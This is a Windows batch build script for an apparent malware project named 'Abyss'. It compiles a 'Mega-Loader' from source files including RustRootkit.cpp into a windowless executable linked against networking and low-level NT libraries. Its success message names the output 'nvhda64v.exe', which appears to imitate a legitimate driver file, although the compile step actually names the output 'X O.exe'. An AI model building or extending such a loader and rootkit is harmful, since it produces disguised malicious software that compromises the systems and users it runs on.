@echo off
echo [Abyss] Compiling Resources...
rc.exe /nologo resources.rc

echo [Abyss] Compiling Mega-Loader (X O.exe)...
if not defined VCINSTALLDIR (
    echo [!] VCINSTALLDIR not defined. Searching for cl.exe...
    where cl.exe >nul 2>&1
    if %errorlevel% neq 0 (
        echo [!] MSVC not in path. Build will likely fail.
    )
)

cl.exe /nologo /EHsc /std:c++17 /O2 AbyssNative.cpp RustRootkit.cpp resources.res /Fe:"X O.exe" /link /SUBSYSTEM:WINDOWS user32.lib advapi32.lib kernel32.lib shell32.lib winhttp.lib ntdll.lib gdi32.lib psapi.lib

if %errorlevel% equ 0 (
    echo [+] Build Successful: nvhda64v.exe
    if exist resources.res del resources.res
) else (
    echo [-] Build Failed.
)
